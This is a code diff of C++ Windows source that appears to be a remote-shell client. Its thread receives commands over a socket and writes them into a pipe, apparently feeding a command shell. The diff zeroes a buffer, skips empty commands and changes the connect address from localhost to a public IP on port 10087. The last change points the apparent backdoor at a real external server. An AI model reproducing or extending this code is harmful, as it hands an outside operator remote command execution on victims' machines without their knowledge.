@@ -201,7 +201,8 @@ DWORD WINAPI recvandsendthread(LPVOID lparam)
         //后面有数据继续收取
         if (drbuf.length >= 0)
         {
-            pdata = new char[drbuf.length + 5];
+            pdata = new char[drbuf.length+5];
+            memset(pdata, 0, drbuf.length+5);
             if (pdata == NULL) return 0;
 
             recvdata(s, pdata, drbuf.length);
@@ -210,10 +211,13 @@ DWORD WINAPI recvandsendthread(LPVOID lparam)
             if (drbuf.type == SEVER_CMD_COMMAND)
             {
 
-                DWORD realwlength;
-                DWORD wlength = strlen(pdata);
-                pdata[wlength++] = '\n';
-                WriteFile(myhwritepipe, pdata, wlength, &realwlength, NULL);
+                if (drbuf.length != 0)
+                {
+                    DWORD realwlength;
+                    DWORD wlength = strlen(pdata);
+                    pdata[wlength++] = '\n';
+                    WriteFile(myhwritepipe, pdata, wlength, &realwlength, NULL);
+                }
 
 
                 while (TRUE)
@@ -375,7 +379,7 @@ int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
             addr.sin_family = AF_INET;
 
 
-            addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
+            addr.sin_addr.S_un.S_addr = inet_addr("39.108.3.173");
             addr.sin_port = htons(10087);
 
             connect(s, (sockaddr*)&addr, length);
